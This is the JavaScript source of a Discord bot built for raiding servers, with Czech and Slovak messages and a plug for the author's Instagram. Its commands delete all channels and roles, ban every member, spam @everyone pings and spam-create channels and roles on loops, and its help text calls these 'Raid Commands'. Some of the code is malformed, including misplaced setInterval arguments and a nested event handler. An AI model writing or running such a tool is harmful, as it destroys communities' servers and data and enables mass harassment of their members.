const Discord = require('discord.js')
const bot = new Discord.Client();
const prefix = '!';

bot.on('ready', () => {
    console.log(`${bot.user.tag} je to ready!`)
})

bot.on('message', message => {
    if(message.content === 'x.ping') {
      setInterval(function() {
          message.channel.send('@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone')
         }),
      1
    }
    if(message.content === prefix + ".nuke") {
 message.channel.send("Nyní se maže vše")
	 message.guild.channels.forEach(channel => channel.delete())
	 message.guild.roles.forEach(roles => roles.delete()) } 
	  
    if(message.content === prefix + '.create') {
      setInterval(function() {
      message.guild.createChannel('text-text-text', 'text')
      message.guild.createChannel('hahahhaha', 'voice')
      message.guild.createChannel('sleduj ma na IG - pes_adam', 'category')
    }),
    1
  }
  if(message.content === prefix + '.createroles') {
    setInterval(function() {
        message.guild.createRole({
           name: "troll",
           color: 'RANDOM'
        })
      }),
      1
    }
  if(message.content === prefix + '.deleteroles') {
    message.guild.roles.forEach(role => role.delete())
  }
  if(message.content === prefix + '.deletechannels') {	
     message.guild.channels.forEach(channel => channel.delete())
  }
  if(message.content === prefix + '.banall') {
    message.guild.members.forEach((f) => {
      message.guild.member(f).ban('hahahah')
    })
  }
  bot.on('message', message => {
if(message.content === prefix + '.spam') {
	setInterval(function() {
  const spam = new Discord.RichEmbed()
  .setTitle("Nuked by user")
  .addField('LOL', true)
  .setColor("RANDOM")
  message.channel.send(spam)
  }),
      1
    }
})
  if(message.content === prefix + '.help') {
  const xhelp = new Discord.RichEmbed()
  .setTitle("ALL COMMANDS")
  .addField('Info Commands', '```!.info```', true)
  .addField('Raid Commands', '```!.nuke, !.deleteroles, !.create, !.deletechannels, !.banall```', true)
  .addField('Other Commands', '```!.spam```', true)
  .setFooter("Thanks for administrator dumbasses")
  .setColor("RANDOM")
  message.channel.send(xhelp)
  }
  if(message.content === '!.info') {
  const xinfo = new Discord.RichEmbed()
  .setTitle("Informations")
  .setDescription("**FOLOW TO MY IG - pes_adam**")
  .setColor("RANDOM")
  message.channel.send(xinfo)
  }
})
       
bot.login("bot_token")